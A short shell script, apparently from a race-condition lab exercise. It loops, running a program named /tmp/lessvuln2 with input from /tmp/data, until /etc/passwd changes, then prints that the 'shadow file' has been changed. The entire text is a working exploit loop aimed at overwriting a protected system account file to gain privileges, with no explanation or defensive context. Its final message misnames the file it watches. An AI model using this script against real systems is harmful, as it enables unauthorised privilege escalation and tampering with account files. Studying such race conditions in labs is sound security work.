#!/bin/sh


old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    new=`ls -l /etc/passwd`
    /tmp/lessvuln2 < /tmp/data
done

echo "STOP... The shadow file has been changed"
